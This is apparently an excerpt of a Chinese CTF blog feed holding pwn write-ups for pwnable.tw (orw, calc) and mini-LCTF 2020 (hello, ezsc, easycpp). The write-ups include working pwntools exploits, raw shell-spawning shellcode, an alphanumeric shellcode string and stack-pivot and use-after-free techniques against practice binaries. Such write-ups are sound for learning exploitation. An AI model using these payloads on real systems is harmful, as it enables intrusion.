</p><p>首先可以看到题目对环境做出了一定的限制</p><p><img src="https://i.loli.net/2020/08/31/39DbCjwxMeYLKry.png" alt="image.png"></p><p>惯例的<code>checksec</code>，发现只开了<code>canary</code></p><p><img src="https://i.loli.net/2020/08/31/pHOQYVeolKvJkxD.png" alt="D_V73A_Y0XS1HEU~_CXRZSH.png"></p><p>拖入IDA进行分析</p><p><img src="https://i.loli.net/2020/08/31/ZtL23IAugR61TzU.png" alt="image.png"></p><p>主程序一开始会先调用<code>orw_seccomp()</code>函数，我们点进去康康</p><p><img src="https://i.loli.net/2020/08/31/nlyewbocGB6zOrv.png" alt="image.png"></p><p>v4是canary的值，我们现在还不知道是否需要绕过canary，故先不予理会</p><p>接下来调用了<code>qmemcpy()</code>函数，实际上就是<code>memcpy</code>函数，将从0x8048640地址开始拷贝0x60字节的数据到v3中，随后赋值12给v1，v2作为指针获取v3的首字节地址</p><p>最后调用<code>prctl()</code>函数，结合题目的说明，我们大致可以猜测到<code>orw_seccomp()</code>函数的作用应该是<strong>禁用其他的系统调用，仅开放sys_read、sys_write、sys_open</strong></p><p>也就是说我们<strong>无法通过sys_execve来getshell</strong></p><p>接下来回到主函数，我们很容易看出该程序会读入最大0xC8字节输入并尝试执行该输入</p><p>结合题目说明，我们<strong>仅考虑构造shellcode来cat flag</strong></p><p>（因为要绕过seccomp来getshell已经是kernel pwn 的级别le，233333）</p><p>故构造exp如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">shellcode &#x3D; &quot;&quot;</span><br><span class="line">shellcode +&#x3D; shellcraft.i386.pushstr(&quot;&#x2F;home&#x2F;orw&#x2F;flag&quot;)</span><br><span class="line">shellcode +&#x3D; shellcraft.i386.linux.syscall(&quot;SYS_open&quot;, &#39;esp&#39;)</span><br><span class="line">shellcode +&#x3D; shellcraft.i386.linux.syscall(&quot;SYS_read&quot;, &#39;eax&#39;, &#39;esp&#39;, 0x30)</span><br><span class="line">shellcode +&#x3D; shellcraft.i386.linux.syscall(&quot;SYS_write&quot;, 1, &#39;esp&#39;, 0x30)</span><br><span class="line">p &#x3D; remote(&#39;chall.pwnable.tw&#39;,10001)</span><br><span class="line">p.sendline(asm(shellcode))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>向服务器发送我们的payload</p><p><img src="https://i.loli.net/2020/08/31/m6YRSEpJFk9wQCb.png" alt="_7__O90_E_I39_HGTFIP__S.png"></p><p>成功得到flag</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">FLAG&#123;sh3llc0ding_w1th_op3n_r34d_writ3&#125;</span><br></pre></td></tr></table></figure><h1 id="0x03-CVE-2018-1160（×）"><a href="#0x03-CVE-2018-1160（×）" class="headerlink" title="0x03.CVE-2018-1160（×）"></a>0x03.CVE-2018-1160（×）</h1><blockquote><p>nc chall.pwnable.tw 10002</p></blockquote><p><a href="/download/pwnabletw/CVE-2018-1160/netatalk.tgz" title="点击此处下载原题">点击下载-netatalk.tgz</a> </p><p><a href="/download/pwnabletw/CVE-2018-1160/libc.so" title="点击此处下载原题">点击下载-libc.so</a> </p><blockquote><p>首先我们先看看CVE是个啥：</p><p> CVE 的英文全称是“Common Vulnerabilities &amp; Exposures”通用漏洞披露。CVE就好像是一个字典表，为广泛认同的<a href="https://baike.baidu.com/item/信息安全/339810" target="_blank" rel="noopener">信息安全</a>漏洞或者已经暴露出来的弱点给出一个公共的<a href="https://baike.baidu.com/item/名称/6546057" target="_blank" rel="noopener">名称</a>。使用一个共同的名字，可以帮助用户在各自独立的各种漏洞数据库中和漏洞评估<a href="https://baike.baidu.com/item/工具/81891" target="_blank" rel="noopener">工具</a>中共享数据，虽然这些工具很难整合在一起。这样就使得CVE成为了安全信息共享的“<a href="https://baike.baidu.com/item/关键字/7105697" target="_blank" rel="noopener">关键字</a>”。如果在一个漏洞报告中<a href="https://baike.baidu.com/item/指明/633104" target="_blank" rel="noopener">指明</a>的一个漏洞，如果有CVE名称，你就可以快速地在任何其它CVE兼容的数据库中找到相应修补的信息，解决安全<a href="https://baike.baidu.com/item/问题/1067365" target="_blank" rel="noopener">问题</a>。 </p><p><a href="https://baike.baidu.com/item/CVE" target="_blank" rel="noopener">百度百科-CVE</a></p></blockquote><p>好家伙，第三题直接上<strong>CVE</strong>，<del>我直接当场暴毙做不出来跳过并进入下一题</del></p><p>惯例的<code>checksec</code>，<strong>保 护 全 开</strong>（噔 噔 咚）</p><p><img src="https://i.loli.net/2020/08/31/DF5AuyjdxZCQq9J.png" alt="2GP_TSHIRJ_~Z_GD6F_E@WQ.png"></p><p>尝试动态调试，这软件太过古老直接跑不起来（悲）</p><p>还是拖入IDA进行分析⑧</p><blockquote><p>咕了，找时间接着更（才不是因为看不懂几百行的main函数（👈菜🐓不请自爬））</p></blockquote><h1 id="0x04-calc"><a href="#0x04-calc" class="headerlink" title="0x04.calc"></a>0x04.calc</h1><blockquote><p>nc chall.pwnable.tw 10003</p></blockquote><p><a href="/download/pwnabletw/calc/calc" title="点击此处下载原题">点击下载-calc</a> </p><p>首先是惯例的<code>checksec</code>，可以看到开了canary保护和栈不可执行保护</p><p><img src="https://i.loli.net/2020/08/31/KYd5sUBSI8ODAtF.png" alt="image.png"></p><p>运行程序我们可以发现这是一个简单的计算器，遇到非法输入会报错、给出错误结果甚至直接退出</p><p><img src="https://i.loli.net/2020/09/01/akJelDmdMbQY7Sx.png" alt="image.png"></p><p>拖入IDA进行分析</p><p><img src="https://i.loli.net/2020/09/01/bOtr7Lpmfc5iP4T.png" alt="image.png"></p><p>结合之前的运行结果，我们容易看出该程序中比较关键的就是<code>calc()</code>函数，进去康康</p><p><img src="https://i.loli.net/2020/09/01/5ntsIupzL7iwby1.png" alt="image.png"></p><p>开头<code>bzero()</code>函数将s上的0x400字节大小的空间全都置为0，随后进入<code>get_exp()</code>函数，我们再跟过去康康</p><p><img src="https://i.loli.net/2020/09/01/cIRm4X3OU7rJFiN.png" alt="image.png"></p><p>我们不难看出该函数的作用便是从输入中<strong>仅读取加减乘除求模运算符与字符0~9</strong>，不合规的输入都会被跳过，读到EOF或换行符会终止，同时最大读入a2个字节，这些输入会被写到a1上</p><p>也就是说该函数的作用便是<strong>读取最大1024个字节的合法输入到s上</strong>，若不存在合法输入，返回的数据则为0，使calc的循环中断，程序结束。</p><p>接下来是<code>init_pool()</code>函数</p><p><img src="https://i.loli.net/2020/09/01/9d3aRTn4jyFxQsD.png" alt="image.png"></p><p>不难看出作用是将a1（calc函数中的v1）上的100个字节赋值0</p><p>接下来就是最关键的<code>parse_expr()</code>函数了，就流程而言漏洞很有可能就在这里（<del>要命的是这个函数很tm长，不禁感慨pwn对逆向基础的要求也不低</del></p><p><img src="https://i.loli.net/2020/09/01/Keb5UGoVu4628fS.png" alt="image.png"></p><p>一开始<code>bzero()</code>将s上的100个字节置0，随后对a1上的字符（也就是先前读入的合法的表达式）逐字符进行判断</p><p><img src="https://i.loli.net/2020/09/01/EC2X13BPOx9Lcme.png" alt="image.png"></p><p>随后，<strong>首先判断是否为+-*/%</strong>等运算符号，因为强制类型转换将a1+i上的值转为<strong>unsigned int</strong>，若是’0’~’9’则肯定会≤9，<strong>若是运算符号，其减去48所得的值小于0，强制类型转换变成unsigned int后会变成一个极大的正整数（必定大于9）</strong></p><blockquote><p>注：这个语句我曾经一直以为是废语句Or2</p></blockquote><p><img src="https://i.loli.net/2020/09/01/vb3EIsGjnUu2xOp.png" alt="image.png"></p><p>随后将该字符前面的<code>i+a1-v5</code>个字符（v5用作可移动索引）用memcpy拷贝至s1中，末尾置’\0’成为字符串，并判断s1是否为”0”，若为0则退出运算</p><p><img src="https://i.loli.net/2020/09/01/Foe2MG9vdKczHY4.png" alt="image.png"></p><p>随后使用atoi将s1转为整数存入v9中，若v9不为0，则将<em>a2[0]+1赋给v4，随后将v9赋给a2[v4+1]，由此我们可以知道*</em>a[0]保存的是已经储存的数字的个数**</p><p>接下来判断我们先前判断的那一个运算符字符的下一个字符是否存在且是否不为运算符（即是否会出现++这样的情况），若是则直接退出运算</p><p><img src="https://i.loli.net/2020/09/01/9jGflRnkt2e67JL.png" alt="image.png"></p><p>接下来首先判断s[v7]是否为0，为0则将运算符存入s[v7]中，由此我们可以知道字符数组s是专门用来储存操作符的</p><p>若s[v7]不为0（即代表先前已经储存了操作符），则分情况判断，若a1+i上的操作符为*/%则对s[v7]进行判断，判断其是否为+或-，由此我们可以看出这应该是一个针对运算符优先级的判断</p><p>若s[v7]的优先级低于a1+i，则进入eval函数，之后将a1+i上的操作符赋给s[v7]，eval传入的参数为a2与s[v7]，同时我们知道a2数组中储存的是需要被我们运算的数</p><p>优先级相同且都为高优先级则将操作符再压入栈中，随后回到循环开头</p><p>a1+i为低优先级（加与减）时则进入eval函数，先对s[v7]进行运算，之后s[v7]出栈再将a1+i入栈</p><p>若遇到字符串结尾则跳出循环</p><p>我们进eval函数里简单看一下</p><p><img src="https://i.loli.net/2020/09/01/PhLB26KCVqea5Zj.png" alt="image.png"></p><p>粗略看了一下大概可以知道eval函数是用来进行运算的函数，</p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;0x00-绪论&quot;&gt;&lt;a href=&quot;#0x00-绪论&quot; class=&quot;headerlink&quot; title=&quot;0x00.绪论&quot;&gt;&lt;/a&gt;0x00.绪论&lt;/h1&gt;&lt;p&gt;&lt;a href=&quot;https://pwnable.tw&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;pwnable.tw&lt;/a&gt;是一个世界范围内很有名的pwn题网站，作为主攻pwn的CTFer，上面的题对我而言自然是很有必要做的（当然我现在还太弱了XD&lt;/p&gt;
&lt;p&gt;点开查看题解👇（&lt;del&gt;当然也有可能我暂时还一题都没有做出来2333&lt;/del&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;注：原题皆可在本页面直接下载&lt;/p&gt;
&lt;/blockquote&gt;</summary>
    
    
    
    <category term="CTF" scheme="http://archive.next.arttnba3.cn/categories/CTF/"/>
    
    
    <category term="信息安全" scheme="http://archive.next.arttnba3.cn/tags/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/"/>
    
    <category term="PWN" scheme="http://archive.next.arttnba3.cn/tags/PWN/"/>
    
    <category term="CTF" scheme="http://archive.next.arttnba3.cn/tags/CTF/"/>
    
    <category term="ret2shellcode" scheme="http://archive.next.arttnba3.cn/tags/ret2shellcode/"/>
    
    <category term="python" scheme="http://archive.next.arttnba3.cn/tags/python/"/>
    
  </entry>
  
  <entry>
    <title>【算法浅析-0x03】求最小生成树——Kruskal算法与Prim算法浅析 by arttnba3</title>
    <link href="http://archive.next.arttnba3.cn/2020/05/19/%E3%80%90%E7%AE%97%E6%B3%95%E6%B5%85%E6%9E%90-0x03%E3%80%91%E6%B1%82%E6%9C%80%E5%B0%8F%E7%94%9F%E6%88%90%E6%A0%91%E2%80%94%E2%80%94Kruskal%E7%AE%97%E6%B3%95%E4%B8%8EPrim%E7%AE%97%E6%B3%95%E6%B5%85%E6%9E%90-by-arttnba3/"/>
    <id>http://archive.next.arttnba3.cn/2020/05/19/%E3%80%90%E7%AE%97%E6%B3%95%E6%B5%85%E6%9E%90-0x03%E3%80%91%E6%B1%82%E6%9C%80%E5%B0%8F%E7%94%9F%E6%88%90%E6%A0%91%E2%80%94%E2%80%94Kruskal%E7%AE%97%E6%B3%95%E4%B8%8EPrim%E7%AE%97%E6%B3%95%E6%B5%85%E6%9E%90-by-arttnba3/</id>
    <published>2020-05-19T04:11:27.000Z</published>
    <updated>2020-09-05T11:40:14.904Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x00-绪论"><a href="#0x00-绪论" class="headerlink" title="0x00 绪论"></a>0x00 绪论</h1><p><strong>Kruskal算法与Prim算法</strong>是较为常用的用来<strong>查找最小生成树</strong>的算法，刚好今天上离散数学课的时候讲到了最小生成树，所以作为一名蒟蒻前OIer咱今天也来简单讲讲XD</p><a id="more"></a><h1 id="0x01-生成树-amp-最小生成树"><a href="#0x01-生成树-amp-最小生成树" class="headerlink" title="0x01 生成树&amp;最小生成树"></a>0x01 生成树&amp;最小生成树</h1><blockquote><p>先咕咕咕着，有时间必写</p></blockquote>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;0x00-绪论&quot;&gt;&lt;a href=&quot;#0x00-绪论&quot; class=&quot;headerlink&quot; title=&quot;0x00 绪论&quot;&gt;&lt;/a&gt;0x00 绪论&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;Kruskal算法与Prim算法&lt;/strong&gt;是较为常用的用来&lt;strong&gt;查找最小生成树&lt;/strong&gt;的算法，刚好今天上离散数学课的时候讲到了最小生成树，所以作为一名蒟蒻前OIer咱今天也来简单讲讲XD&lt;/p&gt;</summary>
    
    
    
    <category term="算法浅析" scheme="http://archive.next.arttnba3.cn/categories/%E7%AE%97%E6%B3%95%E6%B5%85%E6%9E%90/"/>
    
    
    <category term="算法" scheme="http://archive.next.arttnba3.cn/tags/%E7%AE%97%E6%B3%95/"/>
    
    <category term="C/C++" scheme="http://archive.next.arttnba3.cn/tags/C-C/"/>
    
    <category term="图论" scheme="http://archive.next.arttnba3.cn/tags/%E5%9B%BE%E8%AE%BA/"/>
    
  </entry>
  
  <entry>
    <title>【CTF题解-0x01】mini-LCTF 2020 write up by arttnba3</title>
    <link href="http://archive.next.arttnba3.cn/2020/05/11/%E3%80%90CTF%E9%A2%98%E8%A7%A3-0x01%E3%80%91miniLCTF-write-up-by-arttnba3/"/>
    <id>http://archive.next.arttnba3.cn/2020/05/11/%E3%80%90CTF%E9%A2%98%E8%A7%A3-0x01%E3%80%91miniLCTF-write-up-by-arttnba3/</id>
    <published>2020-05-10T17:27:16.000Z</published>
    <updated>2020-12-16T19:22:29.613Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x00-绪论"><a href="#0x00-绪论" class="headerlink" title="0x00.绪论"></a>0x00.绪论</h1><p>mini-LCTF，前身是makerCTF，是西电校内享誉盛名（？）的CTF，作为菜鸡CTFer也尝试着参加了一手</p><p>因为咱主攻PWN的原因，所以这一篇应该只有PWN（</p><p>（不过主要还是因为我太菜了XD</p><blockquote><p>注：所有题目在<a href="https://archive.lctf.online" target="_blank" rel="noopener">archive.lctf.online</a>上都有部署</p></blockquote><a id="more"></a><h1 id="0x01-Sign-in"><a href="#0x01-Sign-in" class="headerlink" title="0x01.Sign in"></a>0x01.Sign in</h1><h2 id="Starting-Point"><a href="#Starting-Point" class="headerlink" title="Starting Point"></a>Starting Point</h2><p>点进页面就可以直接获得flag了</p><h1 id="0x02-PWN"><a href="#0x02-PWN" class="headerlink" title="0x02.PWN"></a>0x02.PWN</h1><h2 id="hello-ret2shellcode"><a href="#hello-ret2shellcode" class="headerlink" title="hello - ret2shellcode"></a>hello - ret2shellcode</h2><p> <a href="/download/minil/pwn/hello"点击此处下载原题"">点击下载-hello</a> </p><blockquote><p>证明了我真的是菜鸡的一道pwn题，搞了半天才明白XD</p></blockquote><p>做题环境<code>Manjaro-KDE</code></p><p>首先使用<code>checksec</code>指令查看保护，可以发现保护基本都是关的，只有<code>Partial RELRO</code>，那么基本上是可以为所欲为了wwww</p><p>拖进<code>IDA</code>进行分析</p><p><img src="https://i.loli.net/2020/05/11/f4qnCg65NPxT2D9.png" alt="image.png"></p><p>可以发现在<code>vul函数</code>存在明显的栈溢出</p><p><img src="https://i.loli.net/2020/05/11/67tk1FiacXVR8ou.png" alt="image.png"></p><p>而程序的主函数中调用了<code>vul</code>函数</p><p><img src="https://i.loli.net/2020/05/11/nKAZp7wUtfV3g6P.png" alt="image.png"></p><p>那么程序漏洞很明显了：</p><ul><li><strong>使用<code>fgets</code>读入最大为72个字节的字符串，但是只分配给了48字节的空间，存在栈溢出</strong></li></ul><p>又有一个可疑的<code>bd</code>函数，那么第一时间想到<strong><code>ret2text</code></strong>——构造payload跳转到<code>bd</code></p><p>但是很明显，<code>bd</code>函数基本是是空的(悲)</p><p><img src="https://i.loli.net/2020/05/11/59MVFNoviEYp4rn.png" alt="image.png"></p><blockquote><p>然后我就在这里卡了半天，证明我真的菜XD，感谢<a href="cor1e.cn">cor1e</a>大佬的耐心解答</p></blockquote><p>那么我们该如何利用这个<code>bd</code>呢？</p><p>可以看到在<code>bd</code>中存在gadgets<code>jmp rsp</code>，那么其实我们可以利用这个指令<strong>跳转回栈上，执行我们放在栈上的shellcode</strong></p><p><strong>也就是说这其实是一道ret2shellcode的题</strong></p><p><strong>我们只需要利用这个gadgets将控制流跳转回栈上并执行我们放置在栈上的代码即可getshell</strong></p><p>那么payload就很容易构造出来了：</p><blockquote><p>注：第一次盲打payload居然错了，我还是太菜了Or2</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">'amd64'</span></span><br><span class="line">sc1 = asm(shellcraft.sh())</span><br><span class="line">sc2 = asm(<span class="string">'sub rsp,64'</span>)</span><br><span class="line">sc3 = asm(<span class="string">'jmp rsp'</span>)</span><br><span class="line">elf = ELF(<span class="string">'./hello'</span>)</span><br><span class="line"></span><br><span class="line">payload = sc1 + <span class="string">b'a'</span>*(<span class="number">56</span>-len(sc1)) + p64(<span class="number">0x4006CA</span>) + sc2 + sc3</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">'./hello'</span>)<span class="comment">#p = remote('pwn.challenge.mini.lctf.online',10050)</span></span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/05/11/DCm7Wv6HMOnVLja.png" alt="image.png"></p><h3 id="高阶解法：栈迁移"><a href="#高阶解法：栈迁移" class="headerlink" title="高阶解法：栈迁移"></a>高阶解法：栈迁移</h3><blockquote><p><del>费力解法</del></p></blockquote><p>假如说这道题并不存在供我们进行跳转的<code>bd函数</code>，给我们的溢出长度就只有72-48=24个字节，但是仅仅是<code>asm(sellcraft.sh())</code>就已经需要48个字节，那么我们该如何通过仅仅24字节的溢出完成pwn呢</p><p>答案是使用<strong><code>栈迁移</code></strong>技术</p><p>我们可以将栈劫持到<code>bss段</code>，再在上面放上我们的shellcode</p><p><img src="https://i.loli.net/2020/08/24/hAHQuxfBneUoR5M.png" alt="image.png"></p><p>故构造exp如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">offset = <span class="number">0x30</span></span><br><span class="line">bss = <span class="number">0x601060</span></span><br><span class="line">back_to_gets = <span class="number">0x4006fa</span></span><br><span class="line"></span><br><span class="line">sc = <span class="string">'\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05'</span></span><br><span class="line">payload1 = <span class="string">b'A'</span>*offset + p64(bss+<span class="number">500</span>) + p64(back_to_gets)</span><br><span class="line">payload2 = sc + <span class="string">b'A'</span>*(offset - len(sc)) + p64(bss+<span class="number">500</span>) + p64(bss+<span class="number">500</span>-offset)</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">'./hellp'</span>)<span class="comment">#p = remote('pwn.challenge.lctf.online', 10037)</span></span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(payload1)</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">p.sendline(payload2)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/09/11/ntiY5C8H3czaEQJ.png" alt="image.png"></p><blockquote><p>如何将一个栈劫持到别的地方？栈迁移的运行原理究竟是？</p><p>做了那么多的pwn题，我们都知道在构造栈溢出的rop链时不仅要算上栈原本所分配的空间的大小，还要算上<code>ebp/rbp</code>寄存器所占用的4/8个字节，之后才到函数的返回地址，这是因为在一个函数启动时，会先将ebp/rbp的值压入栈中，之后将指向栈顶的esp/rsp寄存器的值赋给ebp/rbp寄存器，随后通过ebp/rbp寄存器来实现对栈的访问</p><p><img src="https://i.loli.net/2020/08/24/U8f5Y1CJrsdVT69.png" alt="image.png"></p><p><img src="https://i.loli.net/2020/08/24/jQkcHxb5MgARspU.png" alt="image.png"></p><p>同样的，有压栈同样就会有出栈来恢复ebp/rbp与esp/rsp的值，我们都知道在函数运行到末尾时，会执行<code>leave</code>，<code>retn</code>两条指令</p><p><img src="https://i.loli.net/2020/08/24/v79Elx15bWXdyoZ.png" alt="image.png"></p><p>其中<code>leave</code>指令便是用来恢复栈帧的指令，它等价于如下指令：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">;ebp &amp; esp in 32-bit</span><br><span class="line">mov rsp, rbp</span><br><span class="line">pop rbp</span><br></pre></td></tr></table></figure><p>由于<strong>对栈的访问都是通过ebp/rbp进行的</strong>，那么我们不难想到，只要我们在溢出时<strong>覆写掉栈内储存的原ebp/rbp的值</strong>，<strong>在retn指令返回后程序所判定的栈基址其实就变成了我们所覆写上的那个地址</strong>，之后程序在调用栈上的变量的时候其实都是基于我们所覆写上的新的栈基址进行操作的了，相当于把栈劫持到另一个地方，所以又叫<strong>栈劫持</strong></p></blockquote><blockquote><p>注：赛期因为各种ddl导致只解出了这一道题XD  后面的题解是在赛后写的  部分参照了Lunatic和eqqie师傅的题解</p></blockquote><h2 id="ezsc-Alphanumeric-Shellcode"><a href="#ezsc-Alphanumeric-Shellcode" class="headerlink" title="ezsc - Alphanumeric Shellcode"></a>ezsc - Alphanumeric Shellcode</h2><p> <a href="/download/minil/pwn/ezsc"点击此处下载原题"">点击下载-ezsc</a> </p><p>首先是惯例的<code>checksec</code></p><p><img src="https://i.loli.net/2020/08/10/rDo3CqKSjgBydIT.png" alt="image.png"></p><p>四舍五入保护全关，我们有极大的操作空间</p><h3 id="程序分析"><a href="#程序分析" class="headerlink" title="程序分析"></a>程序分析</h3><p>拖入IDA进行分析</p><p><img src="https://i.loli.net/2020/08/10/CTInhxDcJqsORVy.png" alt="image.png"></p><p>v7是一个函数指针，并被分配到了<code>0x1000</code>大小的内存空间</p><p>程序会从输入流逐字节读入最大4096个字节写入到v7所指向的空间上，且限制输入仅能为字母或数字否则终止输入</p><p>输入结束后尝试执行函数指针v7</p><p>那么我们直接输入一段shellcode即可getshell</p><p>但是限制了输入只能是数字和字母，常见的shellcode都包含一些其他字符</p><p>于是只好百度XD</p><p><img src="https://i.loli.net/2020/08/10/xptnlBUTFKISRsD.png" alt="image.png"></p><p>得知一种叫做<strong>Alphanumeric Shellcode</strong>的东西www</p><h3 id="Alphanumeric-Shelllcode"><a href="#Alphanumeric-Shelllcode" class="headerlink" title="Alphanumeric Shelllcode"></a>Alphanumeric Shelllcode</h3><p>具体参见：<a href="https://www.freebuf.com/articles/system/232280.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/system/232280.html</a></p><p>首先从GitHub上随便找一个轮子</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ git <span class="built_in">clone</span> https://github.com/TaQini/alpha3.git</span><br></pre></td></tr></table></figure><p>然后编写生成我们的shellcode的脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># sc.py</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch=<span class="string">'amd64'</span></span><br><span class="line">sc = shellcraft.sh()</span><br><span class="line"><span class="keyword">print</span> asm(sc)</span><br></pre></td></tr></table></figure><p>输出重定向至文本</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ python sc.py &gt; sc</span><br></pre></td></tr></table></figure><p>使用轮子生成alphanumeric shellcode</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ python ./ALPHA3.py x64 ascii mixedcase rax --input=<span class="string">"sc"</span></span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/08/10/Bg5T7zeZVOWsJ9K.png" alt="image.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Ph0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M2G0Z2o4H0u0P160Z0g7O0Z0C100y5O3G020B2n060N4q0n2t0B0001010H3S2y0Y0O0n0z01340d2F4y8P115l1n0J0h0a071N00</span><br></pre></td></tr></table></figure><p>连接服务端，发送我们的alphanumeric shellcode，成功getshell</p><p>![MVEZ9F_H1__I<code>_</code>_D`AQI_8.png](<a href="https://i.loli.net/2020/09/11/XolvfAEcPxyF6q5.png" target="_blank" rel="noopener">https://i.loli.net/2020/09/11/XolvfAEcPxyF6q5.png</a>)</p><h2 id="easycpp-UAF"><a href="#easycpp-UAF" class="headerlink" title="easycpp - UAF"></a>easycpp - UAF</h2><p> <a href="/download/minil/pwn/easycpp"点击此处下载原题"">点击下载-easycpp</a><br> <a href="/download/minil/pwn/libc.so.6"点击此处下载原题"">点击下载-libc.so.6</a> </p><p>首先是惯例的<code>checksec</code></p><p><img src="https://i.loli.net/2020/08/09/tpZQ1nE5oaGdsRX.png" alt="image.png"></p><p>我们可以看到，和前面几题不同的是这个程序是一个32位的程序</p><blockquote><p>说实话我也不知道为什么画风突变变成32位XD</p></blockquote><h3 id="程序分析-1"><a href="#程序分析-1" class="headerlink" title="程序分析"></a>程序分析</h3><p>拖入IDA进行分析</p><p><img src="https://i.loli.net/2020/08/09/TRhAl2OYk1vWLUn.png" alt="image.png"></p><p>用到了一个名为<code>B</code>的类，我们先看看这个类都有些啥</p><p>IDA中类B有一个构造函数<code>B()</code>和一个<code>print()</code>函数</p><p><img src="https://i.loli.net/2020/08/09/oIvaelmuFLr24JY.png" alt="image.png"></p><p>类B的构造函数如下：</p><p><img src="https://i.loli.net/2020/08/09/s1t4V8f7k9JvLQT.png" alt="image.png"></p><p>类B的构造函数首先调用了类A的构造函数，然后将变量_vptr_A设置为一个函数指针</p><p>我们不难看到在0x80489E4位置上我们还需要再跳转一次到0x80488F2的位置，这个位置上有一个<code>B::print()</code>函数，故可知这是一个<strong>二级函数指针</strong></p><p><img src="https://i.loli.net/2020/08/09/k7gyPQfNmvLeJCn.png" alt="image.png"></p><p><img src="https://i.loli.net/2020/08/09/7ILSlb95q12Dfny.png" alt="image.png"></p><p>我们再来看看类A的构造函数，如下：</p><img src="https://i.loli.net/2020/08/09/thgBiFQcLl86mru.png" alt="image.png" style="zoom:50%;" /><p>类A的构造函数也是将变量<code>_vptr_A</code>设置为一个函数指针</p><p>位于off_80489F0上的函数为<code>A::print()</code></p><p><img src="https://i.loli.net/2020/08/09/5qF6acIEWUGOvZ7.png" alt="image.png"></p><p><img src="https://i.loli.net/2020/08/09/NDidotkIqXPuHn7.png" alt="image.png"></p><p>接下来是main函数的简单分析：</p><p><img src="https://i.loli.net/2020/08/09/TRhAl2OYk1vWLUn.png" alt="image.png"></p><p>v3、v4都是一个类型为<code>类 B</code>的指针</p><p>首先<code>setvbuf()</code>函数将程序设置为无缓冲输入</p><p>之后创建了一个类B的实例并将地址给到指针v3和v4</p><p>之后将该实例内的变量<code>_vptr_A</code>的值设为0</p><p>之后使用delete释放掉之前分配给v3、v4的内存</p><p>之后<strong>从标准输入流读入1024个字节到buf</strong>（或许有操作空间？）</p><p>之后调用<code>strbuf()</code>函数重新分配一段内存空间并将buf的值拷贝一份（当然最后并没有指针接收这一块内存，那么它会成为野内存吗？）</p><p>最后<strong>重新调用v4的函数指针变量所指向的函数</strong></p><p>那么我们在这里就可以发现一个漏洞：</p><h3 id="Use-After-Free"><a href="#Use-After-Free" class="headerlink" title="Use After Free"></a>Use After Free</h3><p>v3、v4所指向的内存空间被释放后v3、v4并没有被设置为NULL，在运行到strdup()函数时这一块内存空间又被重新分配给strdup()函数，而之后又通过v4再次对这一块内存空间进行调用，很明显存在<strong>UAF（Use After Free）</strong>漏洞</p><p>同时我们可以发现存在一个<code>backdoor()</code>函数直接调用了<code>system(&quot;/bin/sh&quot;)</code>，可以直接getshell</p><p><img src="https://i.loli.net/2020/08/09/dPJUXZ6M9kx8RnN.png" 